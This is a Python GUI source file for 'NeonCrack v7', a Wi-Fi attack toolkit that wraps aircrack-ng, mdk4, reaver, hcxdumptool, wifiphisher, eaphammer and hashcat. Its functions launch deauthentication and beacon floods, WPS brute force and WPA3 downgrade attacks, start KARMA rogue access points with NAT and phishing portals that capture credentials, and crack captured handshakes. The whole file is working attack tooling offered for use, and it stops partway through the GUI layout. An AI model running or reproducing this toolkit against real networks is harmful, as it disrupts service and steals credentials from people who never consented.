#!/usr/bin/env python3
"""
────────────────────────────────────────────────────────────
    NeonCrack v7  – WiFi Tactical ToolKit
    created by Null_Lyfe
────────────────────────────────────────────────────────────

"""

# ─────────────────────── imports ───────────────────────────────────────────
import os, subprocess, threading, csv, time, signal, sys, re, collections, shutil, random
from datetime import datetime
from collections import Counter
from tkinter import *
from tkinter import ttk, filedialog, scrolledtext, messagebox, simpledialog
import importlib.util, psutil
import matplotlib; matplotlib.use("TkAgg")
from matplotlib.figure import Figure
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg

# ─────────────────── dependencies list ─────────────────────────────────────
DEP_BINS = [
    "airmon-ng","airodump-ng","aireplay-ng","aircrack-ng","mdk4",
    "hcxdumptool","hcxpcapngtool","wash","hashcat","reaver","bully",
    "wifiphisher","eaphammer","wpa_sycophant","kr00k-hunter","dragondown",
    "hostapd-mana","airbase-ng","dnsmasq","nmap","hashid"
]
DEP_PKGS = ["tkinter","psutil","matplotlib","scapy","hashid","hashcat"]

# ─────────────────── constants / globals ───────────────────────────────────
ACCENT, NEON, BGC = "#ff0080", "#00f0ff", "#0f0f23"
FONT  = ("Courier New", 11)
CAP_DIR = "neoncrack_captures"; os.makedirs(CAP_DIR, exist_ok=True)

root = Tk(); root.title("NeonCrack v7"); root.configure(bg=BGC); root.geometry("1080x850")

# Tk variables
iface_var, target_var    = StringVar(), StringVar()
scan_time                = IntVar(value=45)
pcap_var, word_var       = StringVar(), StringVar()
hash_input               = StringVar()
mon_iface_var            = StringVar()
sticky_mon               = BooleanVar(value=False)
killer_enabled           = BooleanVar(value=False)
nmap_target              = StringVar()
nmap_profile             = StringVar(value="Quick Ping")
nmap_custom              = StringVar()
input_var                = StringVar()     # console entry

# runtime handles
attack_proc = None; scan_proc = None; monitor_flag = False; networks=[]
bw_history  = collections.deque(maxlen=60); bw_stop = threading.Event()

# ─────────────────── subprocess helpers ───────────────────────────────────
def run(cmd, outfile=None):
    return subprocess.Popen(
        cmd,
        stdout=open(outfile, "wb") if outfile else subprocess.DEVNULL,
        stderr=subprocess.STDOUT,
        preexec_fn=os.setsid
    )

def run_logged(cmd, box, outfile=None, *, stdin=False):
    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        stdin=subprocess.PIPE if stdin else None,
        text=True, bufsize=1, universal_newlines=True,
        preexec_fn=os.setsid
    )
    def pump():
        with open(outfile, "a") if outfile else open(os.devnull, "w") as fh:
            for ln in proc.stdout:
                box.insert(END, ln); box.see(END); fh.write(ln)
    threading.Thread(target=pump, daemon=True).start()
    return proc

def log(box, msg): box.insert(END, msg + "\n"); box.see(END)

# ─────────────────── interface helpers ─────────────────────────────────────
def iw_interfaces():
    try: out = subprocess.check_output(["iw", "dev"], text=True).splitlines()
    except subprocess.CalledProcessError: return []
    return [l.split()[1] for l in out if l.strip().startswith("Interface")]

def refresh_iface_menu():
    m = iface_menu["menu"]; m.delete(0, "end")
    for i in iw_interfaces():
        m.add_command(label=i, command=lambda v=i: iface_var.set(v))

def set_monitor(iface, en=True):
    global monitor_flag
    if not iface: return
    subprocess.run(["airmon-ng", "start" if en else "stop", iface],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    iface_var.set(iface + "mon" if en and not iface.endswith("mon")
                  else iface.replace("mon", ""))
    monitor_flag = en; refresh_iface_menu()

def restore_monitor():
    if not sticky_mon.get() and monitor_flag:
        set_monitor(iface_var.get(), False)

# ─────────────────── Killer toggle ─────────────────────────────────────────
_SERVICE_UNITS = ["NetworkManager", "wpa_supplicant", "ModemManager"]
def toggle_killer():
    if killer_enabled.get():
        for s in _SERVICE_UNITS:
            subprocess.run(["systemctl", "stop", s],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["pkill", "-9", "dhclient"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        log(utils_out, "[+] Killer: services stopped")
    else:
        for s in _SERVICE_UNITS:
            subprocess.run(["systemctl", "start", s],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        log(utils_out, "[*] Killer: services restarted")

# ─────────────────── NAT helpers ───────────────────────────────────────────
def enable_nat(uplink, ap_if):
    subprocess.run(["sysctl","-w","net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL)
    subprocess.run(["iptables","-t","nat","-F"], stdout=subprocess.DEVNULL)
    subprocess.run(["iptables","-t","nat","-A","POSTROUTING","-o",uplink,"-j","MASQUERADE"], stdout=subprocess.DEVNULL)
    subprocess.run(["iptables","-A","FORWARD","-i",uplink,"-o",ap_if,"-m","state","--state","RELATED,ESTABLISHED","-j","ACCEPT"], stdout=subprocess.DEVNULL)
    subprocess.run(["iptables","-A","FORWARD","-i",ap_if,"-o",uplink,"-j","ACCEPT"], stdout=subprocess.DEVNULL)

def disable_nat():
    subprocess.run(["iptables","-t","nat","-F"], stdout=subprocess.DEVNULL)
    subprocess.run(["iptables","-F"], stdout=subprocess.DEVNULL)
    subprocess.run(["sysctl","-w","net.ipv4.ip_forward=0"], stdout=subprocess.DEVNULL)

# ─────────────────── bandwidth monitor ─────────────────────────────────────
def update_bw_plot():
    if not bw_history: return
    up=[u for u,_ in bw_history]; dn=[d for _,d in bw_history]
    xs=list(range(-len(up)+1,1))
    if len(xs)==1: xs=[-1,0]; up.append(up[0]); dn.append(dn[0])
    ln_up.set_data(xs,up); ln_dn.set_data(xs,dn)
    ax.set_xlim(xs[0],xs[-1]); ax.set_ylim(0,max(max(up+dn),1)*1.2)
    canvas.draw_idle()

def poll_bw(iface):
    try: prev = psutil.net_io_counters(pernic=True)[iface]
    except KeyError:
        log(utils_out, f"[!] iface {iface} not found"); return
    bw_history.append((0,0)); update_bw_plot()
    while not bw_stop.is_set():
        time.sleep(1)
        try: now = psutil.net_io_counters(pernic=True)[iface]
        except KeyError:
            log(utils_out, "iface vanished"); break
        up=(now.bytes_sent-prev.bytes_sent)/125000
        dn=(now.bytes_recv-prev.bytes_recv)/125000
        bw_history.append((up,dn)); prev=now; update_bw_plot()

def start_bw_monitor():
    iface = mon_iface_var.get().strip()
    if iface not in psutil.net_io_counters(pernic=True):
        messagebox.showerror("iface", iface or "blank"); return
    stop_bw_monitor(); bw_history.clear(); bw_stop.clear()
    threading.Thread(target=poll_bw, args=(iface,), daemon=True).start()
    log(utils_out, f"[*] Monitoring {iface}")

def stop_bw_monitor(): bw_stop.set()

# ─────────────────── CSV & WPS helpers ─────────────────────────────────────
def parse_csv(path):
    out=[]
    with open(path,newline='') as f:
        for r in csv.reader(f):
            if len(r)>13 and r[0] and r[0]!="BSSID":
                out.append((r[0].strip().upper(), r[3].strip(),
                            r[13].strip() or "<hidden>", r[5].strip()))
    return out

def detect_wps(mon, chans):
    hits=set()
    for ch in chans:
        try:
            o=subprocess.check_output(["timeout","3","wash","-i",mon,"-c",ch,"-s"],
                                      text=True,stderr=subprocess.DEVNULL)
            hits.update(m.group(1).upper() for m in
                (re.match(r"([0-9A-Fa-f:]{17})",l) for l in o.splitlines()) if m)
        except subprocess.CalledProcessError: pass
    log(scan_out, f"[*] WPS sniff → {len(hits)} flagged"); return hits

# ─────────────────── Wi-Fi scan engine ─────────────────────────────────────
def do_scan(channel_hop=False):
    global scan_proc
    iface = iface_var.get()
    if not iface:
        messagebox.showwarning("Interface","Select iface"); return
    set_monitor(iface,True); mon = iface_var.get()
    tag = "hop" if channel_hop else "dwell"
    ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
    fn  = os.path.join(CAP_DIR, f"scan_{tag}_{ts}")
    cmd = ["airodump-ng","-w",fn,"--output-format","csv"]
    if not channel_hop: cmd += ["-c","1,6,11"]
    cmd.append(mon)
    scan_proc = run_logged(cmd, scan_out); log(scan_out, "[*] scanning…")
    time.sleep(scan_time.get())
    if scan_proc.poll() is None: scan_proc.terminate(); time.sleep(2)
    csvp = fn + "-01.csv"; scan_proc=None
    if not os.path.isfile(csvp):
        log(scan_out,"[!] CSV missing"); restore_monitor(); return
    base=parse_csv(csvp); wps=detect_wps(mon,[c for _,c,_,_ in base])
    global networks; networks=[]
    scan_out.insert(END,"# |      BSSID       | CH | ENC | WPS | ESSID\n"+"-"*72+"\n")
    for i,(bssid,ch,essid,enc) in enumerate(base,1):
        flag="Y" if bssid in wps else "-"
        networks.append((bssid,ch,essid,enc,flag))
        scan_out.insert(END,f"{i:2}| {bssid} |{ch:>3}|{enc:^5}|  {flag} | {essid}\n")
    target_menu["menu"].delete(0,"end")
    for i,(_,_,essid,_,_) in enumerate(networks,1):
        target_menu["menu"].add_command(label=f"{i} – {essid}",
                                        command=lambda v=str(i): target_var.set(v))
    log(scan_out,f"[+] {len(networks)} nets."); restore_monitor()

def stop_scan():
    global scan_proc
    if scan_proc and scan_proc.poll() is None:
        try: os.killpg(os.getpgid(scan_proc.pid), signal.SIGTERM)
        except Exception: pass
        scan_proc=None; restore_monitor(); log(scan_out,"[!] Scan aborted")

# ─────────────────── nmap helper ───────────────────────────────────────────
def start_nmap_scan():
    tgt = nmap_target.get().strip()
    if not tgt:
        messagebox.showwarning("Target","Specify host/CIDR"); return
    profiles={"Quick Ping":["-sn"],"Top-100 Ports":["-F"],"Full TCP":["-sS","-p-"],
              "OS Detect":["-O","-sS","-F"],"Vuln Script":["--script","vuln"],
              "Custom":nmap_custom.get().split()}
    opts=profiles[nmap_profile.get()]
    out=os.path.join(CAP_DIR,f"nmap_{tgt.replace('/','_')}_{int(time.time())}.log")
    log(scan_out,f"[*] nmap {' '.join(opts)} {tgt}")
    run_logged(["nmap",*opts,tgt], scan_out, out)

# ─────────────────── handshake monitor ─────────────────────────────────────
def handshake_monitor(cap, bssid):
    global attack_proc
    while attack_proc and attack_proc.poll() is None:
        try:
            out = subprocess.check_output(
                ["aircrack-ng","-a","2","-w","/dev/null","-b",bssid,cap],
                text=True, stderr=subprocess.DEVNULL, timeout=20
            )
            if "handshake" in out.lower():
                log(att_out,"[+] Handshake found – stopping")
                os.killpg(os.getpgid(attack_proc.pid),signal.SIGTERM)
                attack_proc=None; restore_monitor(); return
        except subprocess.TimeoutExpired: pass
        time.sleep(15)

# ─────────────────── attack helpers (stdin=True) ───────────────────────────
def pick_target():
    if not target_var.get():
        messagebox.showinfo("Target","Pick BSSID"); return None
    return networks[int(target_var.get())-1]

# ---- Capture / Rogue / Disruption / Exploit modules -----------------------
# (All functions from v3.6.9 retained; only GUI width changed.)

def start_pmkid():
    t=pick_target(); iface=iface_var.get()
    if not t:return
    bssid,ch,essid,_,_=t; set_monitor(iface,True); mon=iface_var.get()
    pcap=os.path.join(CAP_DIR,f"pmkid_{essid}_{int(time.time())}.pcapng")
    global attack_proc; attack_proc=run_logged(["hcxdumptool","-i",mon,"--filterlist_ap",bssid,"--enable_status=1"],
        att_out, pcap, stdin=True)
    log(att_out,f"[*] PMKID capture → {pcap}")

def start_handshake():
    t=pick_target(); iface=iface_var.get()
    if not t:return
    bssid,ch,essid,_,_=t; set_monitor(iface,True); mon=iface_var.get()
    pref=os.path.join(CAP_DIR,f"hs_{essid}_{int(time.time())}")
    global attack_proc; attack_proc=run_logged(["airodump-ng","-c",ch,"--bssid",bssid,"-w",pref,mon],
        att_out, pref+".log", stdin=True)
    run(["aireplay-ng","-0","10","-a",bssid,mon]).wait()
    threading.Thread(target=handshake_monitor,args=(pref+"-01.cap",bssid),daemon=True).start()

def start_mass_pmkid():
    iface=iface_var.get()
    if not iface: messagebox.showwarning("Interface","Select iface"); return
    set_monitor(iface,True); mon=iface_var.get()
    pcap=os.path.join(CAP_DIR,f"pmkid_sweep_{datetime.now():%Y%m%d_%H%M%S}.pcapng")
    global attack_proc; attack_proc=run_logged(["hcxdumptool","-i",mon,"--enable_status=15","-o",pcap],
        att_out, pcap, stdin=True)
    def batch():
        while attack_proc and attack_proc.poll() is None:
            conv=pcap.replace(".pcapng",f"_{int(time.time())}.hccapx")
            run(["hcxpcapngtool","-o",conv,pcap]).wait()
            log(att_out,f"[+] PMKID batch → {conv}"); time.sleep(300)
    threading.Thread(target=batch,daemon=True).start()
    log(att_out,"[*] Mass PMKID sweep running")

def start_wps():
    t=pick_target(); iface=iface_var.get()
    if not t:return
    bssid,ch,essid,_,_=t; set_monitor(iface,True); mon=iface_var.get()
    tool="reaver" if shutil.which("reaver") else "bully"
    cmd=["reaver","-i",mon,"-b",bssid,"-c",ch,"-vv"] if tool=="reaver" else ["bully","-b",bssid,"-c",ch,mon]
    logf=os.path.join(CAP_DIR,f"wps_{essid}_{int(time.time())}.log")
    global attack_proc; attack_proc=run_logged(cmd,att_out,logf,stdin=True)
    log(att_out,f"[*] {tool} running")

def start_deauth():
    t=pick_target(); iface=iface_var.get()
    if not t:return
    bssid,_,essid,_,_=t; set_monitor(iface,True); mon=iface_var.get()
    if shutil.which("mdk4"):
        cmd,tag=["mdk4",mon,"d","-B",bssid],"mdk4"
    else:
        cmd,tag=["aireplay-ng","--deauth","0","-a",bssid,mon],"aireplay"
    logf=os.path.join(CAP_DIR,f"{tag}_{essid}_{int(time.time())}.log")
    global attack_proc; attack_proc=run_logged(cmd,att_out,logf,stdin=True)
    log(att_out,"[*] Deauth flood running")

def start_beacon():
    iface=iface_var.get()
    if not shutil.which("mdk4"): messagebox.showerror("mdk4","Install mdk4"); return
    set_monitor(iface,True); mon=iface_var.get()
    ssidfile=os.path.join(CAP_DIR,f"ssid_{int(time.time())}.txt")
    with open(ssidfile,"w") as f: [f.write(f"neon-{i:03}\n") for i in range(100)]
    global attack_proc; attack_proc=run_logged(["mdk4",mon,"b","-f",ssidfile,"-c","1,6,11"],
        att_out, ssidfile+".log", stdin=True)
    log(att_out,"[*] Beacon spam running")

def start_wpa3_downgrade():
    t=pick_target(); iface=iface_var.get()
    if not t:return
    bssid,ch,essid,enc,_=t
    if "SAE" not in enc and "WPA3" not in enc:
        messagebox.showinfo("Not WPA3","AP isn’t SAE"); return
    if shutil.which("dragondown") is None:
        messagebox.showerror("dragondown","Install hashcat-utils"); return
    set_monitor(iface,True); mon=iface_var.get()
    logf=os.path.join(CAP_DIR,f"dragondown_{essid}_{int(time.time())}.log")
    global attack_proc; attack_proc=run_logged(["dragondown","-i",mon,"-b",bssid,"-c",ch],
        att_out, logf, stdin=True)
    log(att_out,"[*] Dragonblood running")

def start_sycophant():
    t=pick_target(); iface=iface_var.get()
    if not t:return
    if shutil.which("wpa_sycophant") is None: messagebox.showerror("Missing","wpa_sycophant not in $PATH"); return
    bssid,ch,_,_,_=t; set_monitor(iface,True); mon=iface_var.get()
    cmd=["wpa_sycophant","-i",mon,"-c",ch,"-t",bssid]
    global attack_proc; attack_proc=run_logged(cmd,att_out,stdin=True)
    log(att_out,"[*] "+" ".join(cmd))

def start_kr00k():
    t=pick_target(); iface=iface_var.get()
    if not t:return
    if shutil.which("kr00k-hunter") is None: messagebox.showerror("Missing","pip3 install kr00k-hunter"); return
    bssid,ch,_,_,_=t; set_monitor(iface,True); mon=iface_var.get()
    cmd=["kr00k-hunter","-i",mon,"-c",ch,"-b",bssid]
    global attack_proc; attack_proc=run_logged(cmd,att_out,stdin=True)
    log(att_out,"[*] "+" ".join(cmd))

def start_eaphammer():
    iface=iface_var.get()
    if not iface: messagebox.showwarning("Iface","Select iface"); return
    if shutil.which("eaphammer") is None: messagebox.showerror("Missing","Install eaphammer"); return
    domain=simpledialog.askstring("Domain","Target AD domain (blank = rogue)",parent=root) or "evil.local"
    cmd=["eaphammer","-i",iface,"--essid","CorpEAP","--creds","--hw-mode","g","--channel","6","--domain",domain]
    global attack_proc; attack_proc=run_logged(cmd,att_out,stdin=True)
    log(att_out,"[*] "+" ".join(cmd))

def start_chopchop():
    t=pick_target(); iface=iface_var.get()
    if not t:return
    bssid,ch,_,enc,_=t
    if "TKIP" not in enc.upper():
        messagebox.showinfo("Not TKIP","AP isn’t using TKIP"); return
    set_monitor(iface,True); mon=iface_var.get()
    src="02:"+":".join(f"{random.randint(0,255):02x}" for _ in range(5))
    cmd=["aireplay-ng","-4","-b",bssid,"-h",src,mon]
    global attack_proc; attack_proc=run_logged(cmd,att_out,stdin=True)
    log(att_out,"[*] "+" ".join(cmd))

def start_michael_reset():
    t=pick_target(); iface=iface_var.get()
    if not t:return
    if shutil.which("mdk4") is None: messagebox.showerror("mdk4","Install mdk4"); return
    bssid,ch,_,enc,_=t
    if "TKIP" not in enc.upper():
        messagebox.showinfo("Not TKIP","AP isn’t using TKIP"); return
    set_monitor(iface,True); mon=iface_var.get()
    global attack_proc; attack_proc=run_logged(["mdk4",mon,"m","-t",bssid],att_out,stdin=True)
    log(att_out,"[*] Michael reset running")

def start_probe_flood():
    iface=iface_var.get()
    if shutil.which("mdk4") is None: messagebox.showerror("mdk4","Install mdk4"); return
    set_monitor(iface,True); mon=iface_var.get()
    global attack_proc; attack_proc=run_logged(["mdk4",mon,"p"],att_out,stdin=True)
    log(att_out,"[*] Probe-response flood running")

def start_karma():
    iface=iface_var.get()
    if not iface: messagebox.showwarning("Interface","Select iface"); return
    uplink=simpledialog.askstring("Uplink iface","Outbound NIC",parent=root)
    if not uplink: return
    set_monitor(iface,True); mon=iface_var.get()
    enable_nat(uplink,mon)
    if shutil.which("hostapd-mana"):
        cfg=os.path.join(CAP_DIR,"mana.conf")
        open(cfg,"w").write(f"interface={mon}\ndriver=nl80211\nssid=FreeWifi\nhw_mode=g\nchannel=6\n")
        cmd=["hostapd-mana",cfg]
    else:
        cmd=["airbase-ng","-P","-C","30","-v","FreeWifi",mon]
    logf=os.path.join(CAP_DIR,f"karma_{int(time.time())}.log")
    global attack_proc; attack_proc=run_logged(cmd,att_out,logf,stdin=True)
    dns_conf=os.path.join(CAP_DIR,"karma.dnsmasq")
    open(dns_conf,"w").write(f"interface={mon}\ndhcp-range=10.0.0.20,10.0.0.250,12h\n")
    run(["dnsmasq","--conf-file="+dns_conf])
    log(att_out,"[*] KARMA rogue-AP running")

def start_wifiphisher():
    iface=iface_var.get()
    if not iface: messagebox.showwarning("Interface","Select iface"); return
    if shutil.which("wifiphisher") is None: messagebox.showerror("Missing","Install wifiphisher"); return
    jam_iface=simpledialog.askstring("Jam iface (optional)","Second NIC for jamming (blank = same)",parent=root) or iface
    subprocess.run(["systemctl","stop","NetworkManager"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
    cmd=["wifiphisher","-aI",iface,"-eI",jam_iface]; 
    if jam_iface==iface: cmd.append("--nojamming")
    global attack_proc; attack_proc=run_logged(cmd,att_out,stdin=True)
    log(att_out,"[*] "+" ".join(cmd))

# ─────────────────── crack / hash / cleaner helpers ────────────────────────
def browse_pcap():  pcap_var.set(filedialog.askopenfilename(filetypes=[("Capture","*.cap *.pcap *.pcapng *.hccapx")]))
def browse_word():  word_var.set(filedialog.askopenfilename(filetypes=[("Wordlist","*.txt *.lst")]))

def crack():
    cap,wl=pcap_var.get(),word_var.get()
    if not (cap and wl):
        messagebox.showwarning("Missing","Select both"); return
    if cap.endswith((".pcap",".pcapng",".cap")):
        conv=os.path.join(CAP_DIR,f"conv_{int(time.time())}.hccapx")
        run(["hcxpcapngtool","-o",conv,cap]).wait(); cap=conv
    run_logged(["hashcat","-m","22000",cap,wl,"--force"],crack_out)

def identify_hash(h):
    if shutil.which("hashid"):
        try:return subprocess.check_output(["hashid","-m",h],text=True,stderr=subprocess.DEVNULL)
        except subprocess.CalledProcessError: pass
    return {32:"Likely MD5",40:"Likely SHA-1",64:"Likely SHA-256"}.get(len(h),"Unknown")

def hashid_action():
    h=hash_input.get().strip(); hashid_out.delete("1.0",END)
    if h: hashid_out.insert(END,identify_hash(h)+"\n")

def clean_capture():
    cap=filedialog.askopenfilename(filetypes=[("pcapng","*.pcapng")])
    if not cap:return
    out=cap.replace(".pcapng","_cleaned.pcapng")
    run(["hcxpcapngtool","--cleanall","-o",out,cap]).wait()
    cleaner_out.insert(END,f"[+] Cleaned → {out}\n")

def show_stats():
    pot=os.path.expanduser("~/.hashcat/hashcat.potfile")
    utils_out.delete("1.0",END)
    if not os.path.isfile(pot):
        utils_out.insert(END,"No potfile.\n"); return
    dist=Counter(len(l.split(':',1)[1].strip()) for l in open(pot) if ':' in l)
    utils_out.insert(END,"Len | Count\n--------------\n")
    for l,c in sorted(dist.items()): utils_out.insert(END,f"{l:3} | {c}\n")

# ─────────────────── Dependency Doctor ─────────────────────────────────────
def dependency_doctor():
    utils_out.delete("1.0",END)
    okB, missB = [], []
    for exe in DEP_BINS: (okB if shutil.which(exe) else missB).append(exe)
    utils_out.insert(END,"=== Binaries ===\n")
    for e in okB:   utils_out.insert(END,f"[✓] {e}\n","ok")
    for e in missB: utils_out.insert(END,f"[✗] {e}\n","miss")
    okP, missP = [], []
    for m in DEP_PKGS: (okP if importlib.util.find_spec(m) else missP).append(m)
    utils_out.insert(END,"\n=== Python packages ===\n")
    for m in okP:   utils_out.insert(END,f"[✓] {m}\n","ok")
    for m in missP: utils_out.insert(END,f"[✗] {m}\n","miss")
    utils_out.insert(END,f"\nBins {len(okB)}/{len(DEP_BINS)} | PyPkgs {len(okP)}/{len(DEP_PKGS)}\n")
    utils_out.tag_config("ok",foreground="#00ff88"); utils_out.tag_config("miss",foreground="#ff4030")

# ─────────────────── console sender ────────────────────────────────────────
def send_to_proc(_=None):
    line=input_var.get().strip()
    if not line: return
    if attack_proc and attack_proc.poll() is None and attack_proc.stdin:
        try:
            attack_proc.stdin.write(line+"\n"); attack_proc.stdin.flush()
            att_out.insert(END,f"> {line}\n"); att_out.see(END)
        except (BrokenPipeError,OSError):
            messagebox.showwarning("stdin closed","Process no longer accepts input.")
    else:
        messagebox.showwarning("No active attack","Start an attack first.")
    input_var.set("")

# ─────────────────── stop / reset ──────────────────────────────────────────
def stop_attack():
    disable_nat(); stop_bw_monitor()
    global attack_proc
    if attack_proc:
        try: os.killpg(os.getpgid(attack_proc.pid),signal.SIGTERM)
        except Exception: pass
        attack_proc=None
    subprocess.run(["systemctl","start","NetworkManager"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
    restore_monitor(); log(att_out,"[!] Attack stopped")

def reset_toolkit(exit_after=False):
    stop_attack(); stop_scan()
    killer_enabled.set(False); toggle_killer()
    for svc in ("wpa_supplicant",):
        subprocess.run(["systemctl","restart",svc],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
    for box in (scan_out,att_out,crack_out,hashid_out,utils_out): box.delete("1.0",END)
    for v in (target_var,pcap_var,word_var,hash_input,iface_var,nmap_target,nmap_custom,input_var): v.set("")
    refresh_iface_menu(); log(scan_out,"[*] Toolkit reset")
    if exit_after: root.quit()

# ─────────────────── GUI layout ────────────────────────────────────────────
style=ttk.Style(); style.theme_use("alt")
style.configure("TNotebook.Tab",background="#1a1a1a",foreground=NEON,padding=8,font=FONT)
style.configure("Nc.TLabelframe",background=BGC,foreground=NEON,bordercolor=NEON)
style.configure("Nc.TLabelframe.Label",background=BGC,foreground=NEON,font=FONT)

nb=ttk.Notebook(root); nb.pack(fill=BOTH,expand=True)
tabs={}
for k,lbl in [("scan","⚡ Scan"),("attack","⚔️ Attacks"),
              ("crack","💥 Crack"),("hash","🔎 Hash ID"),
              ("clean","🧹 Cleaner"),("utils","🛠 Utilities")]:
    fr=Frame(nb,bg=BGC); nb.add(fr,text=lbl); tabs[k]=fr

# ── Scan tab ---------------------------------------------------------------
ts=tabs["scan"]
row=Frame(ts,bg=BGC); row.pack(fill=X,pady=4)
iface_menu=OptionMenu(row,iface_var,*iw_interfaces()); iface_menu.grid(row=0,column=0,padx=4)
refresh_iface_menu()
Button(row,text="EnableMon",bg=ACCENT,fg="white",command=lambda:set_monitor(iface_var.get(),True)).grid(row=0,column=1,padx=2)
Button(row,text="DisableMon",bg="#ff0030",fg="white",command=lambda:set_monitor(iface_var.get(),False)).grid(row=0,column=2,padx=2)
Label(row,text="Dwell s",bg=BGC,fg=NEON).grid(row=0,column=3,sticky="e")
Spinbox(row,from_=15,to=180,textvariable=scan_time,width=6).grid(row=0,column=4,sticky="w",padx=(0,6))
Button(row,text="Focused",bg=ACCENT,fg="white",command=lambda:threading.Thread(target=do_scan,daemon=True).start()).grid(row=0,column=5,padx=2)
Button(row,text="Hop",bg=ACCENT,fg="white",command=lambda:threading.Thread(target=do_scan,kwargs={'channel_hop':True},daemon=True).start()).grid(row=0,column=6,padx=2)
Button(row,text="Stop Scan",bg="#ff0030",fg="white",command=stop_scan).grid(row=0,column=7,padx=6)
Frame(ts,height=2,bg=NEON).pack(fill=X,pady=6)
nrow=Frame(ts,bg=BGC); nrow.pack(fill=X,pady=2)
Label(nrow,text="nmap Target",bg=BGC,fg=NEON).grid(row=0,column=0,padx=4)
Entry(nrow,textvariable=nmap_target,width=18).grid(row=0,column=1)
OptionMenu(nrow,nmap_profile,"Quick Ping","Top-100 Ports","Full TCP","OS Detect","Vuln Script","Custom").grid(row=0,column=2,padx=4)
custom_entry=Entry(nrow,textvariable=nmap_custom,width=22,state="disabled"); custom_entry.grid(row=0,column=3,padx=4)
nmap_profile.trace_add("write",lambda *_: custom_entry.config(state="normal" if nmap_profile.get()=="Custom" else "disabled"))
Button(nrow,text="Run nmap",bg=ACCENT,fg="white",command=lambda:threading.Thread(target=start_nmap_scan,daemon=True).start()).grid(row=0,column=4,padx=4)
scan_out=scrolledtext.ScrolledText(ts,width=115,height=20,bg="#0d0d17",fg=NEON,font=("Consolas",10)); scan_out.pack(fill=BOTH,expand=True,pady=6,padx=2)

# ── Attack tab : scrollable canvas ----------------------------------------
ta=tabs["attack"]
attack_canvas=Canvas(ta,bg=BGC,highlightthickness=0)
attack_vsb=ttk.Scrollbar(ta,orient="vertical",command=attack_canvas.yview)
attack_canvas.configure(yscrollcommand=attack_vsb.set)
attack_vsb.pack(side=RIGHT,fill=Y); attack_canvas.pack(side=LEFT,fill=BOTH,expand=True)
scroll_f=Frame(attack_canvas,bg=BGC); attack_canvas.create_window((0,0),window=scroll_f,anchor="nw")
scroll_f.bind("<Configure>",lambda e: attack_canvas.configure(scrollregion=attack_canvas.bbox("all")))
def _mw(ev): attack_canvas.yview_scroll(int(-((ev.delta or (120 if ev.num==5 else -120))/120)),"units")
for ev in ("<MouseWheel>","<Button-4>","<Button-5>"): attack_canvas.bind_all(ev,_mw)

target_menu=OptionMenu(scroll_f,target_var,""); target_menu.pack(fill=X,padx=10,pady=4)
lf_cap=ttk.LabelFrame(scroll_f,text="📡 Captures",style="Nc.TLabelframe");       lf_cap.pack(fill=X,padx=8,pady=4)
lf_rog=ttk.LabelFrame(scroll_f,text="🪪 Rogue AP / Phish",style="Nc.TLabelframe");lf_rog.pack(fill=X,padx=8,pady=4)
lf_dis=ttk.LabelFrame(scroll_f,text="⚔️ Disruption",style="Nc.TLabelframe");     lf_dis.pack(fill=X,padx=8,pady=4)
lf_exp=ttk.LabelFrame(scroll_f,text="🛠 WPA Exploits",style="Nc.TLabelframe");   lf_exp.pack(fill=X,padx=8,pady=4)

def _grid(frame,buttons):
    for i,(txt,fn) in enumerate(buttons):
        r,c=divmod(i,2)
        Button(frame,text=txt,command=fn,bg=ACCENT,fg="white",font=FONT,
               height=1,width=18,pady=1).grid(row=r,column=c,sticky="ew",padx=2,pady=1)
    for c in (0,1): frame.columnconfigure(c,weight=1)

_grid(lf_cap,[("PMKID Capture",start_pmkid),
              ("4-Way Handshake",start_handshake),
              ("Mass-PMKID Sweep",start_mass_pmkid)])
_grid(lf_rog,[("KARMA Rogue-AP",start_karma),
              ("Wifiphisher Portal",start_wifiphisher),
              ("EAPHammer Enterprise",start_eaphammer)])
_grid(lf_dis,[("Deauth Flood",start_deauth),
              ("Beacon Spam",start_beacon),
              ("Probe-Resp Flood",start_probe_flood)])
_grid(lf_exp,[("WPS Bruteforce",start_wps),
              ("WPA3 → WPA2 Down",start_wpa3_downgrade),
              ("SAE/OWE Downgrade",start_sycophant),
              ("TKIP Chop-Chop",start_chopchop),
              ("TKIP Michael Reset",start_michael_reset),
              ("Kr00k-Hunter",start_kr00k)])

Button(scroll_f,text="Stop Attack",bg="#ff0030",fg="white",font=FONT,height=1,width=40,command=stop_attack).pack(fill=X,padx=20,pady=6)
att_out=scrolledtext.ScrolledText(scroll_f,width=115,height=18,bg="#0d0d17",fg=NEON,font=("Consolas",10)); att_out.pack(fill=X,pady=(0,8),padx=2)
inp_row=Frame(scroll_f,bg=BGC); inp_row.pack(fill=X,padx=10,pady=(0,8))
Entry(inp_row,textvariable=input_var,bg="#181818",fg="white",insertbackground="white",font=("Consolas",9)).pack(side=LEFT,fill=X,expand=True)
Button(inp_row,text="Send",bg=ACCENT,fg="white",font=FONT,width=10,command=send_to_proc).pack(side=LEFT,padx=6)
inp_row.bind_all("<Return>",send_to_proc)

# ── Crack tab --------------------------------------------------------------
tc=tabs["crack"]
Entry(tc,textvariable=pcap_var,width=85).pack(pady=2)
Button(tc,text="Browse pcap",command=browse_pcap).pack()
Entry(tc,textvariable=word_var,width=85).pack(pady=2)
Button(tc,text="Browse wordlist",command=browse_word).pack()
Button(tc,text="Start Crack",bg=ACCENT,fg="white",
       command=lambda:threading.Thread(target=crack,daemon=True).start()).pack(pady=4)
crack_out=scrolledtext.ScrolledText(tc,width=115,height=18,bg="#0d0d17",fg=NEON,font=("Consolas",10)); crack_out.pack()

# ── Hash tab ---------------------------------------------------------------
th=tabs["hash"]
Entry(th,textvariable=hash_input,width=85).pack(pady=4)
Button(th,text="Identify Hash",bg=ACCENT,fg="white",command=hashid_action).pack()
hashid_out=scrolledtext.ScrolledText(th,width=115,height=18,bg="#0d0d17",fg=NEON,font=("Consolas",10)); hashid_out.pack()

# ── Cleaner tab ------------------------------------------------------------
cl=tabs["clean"]
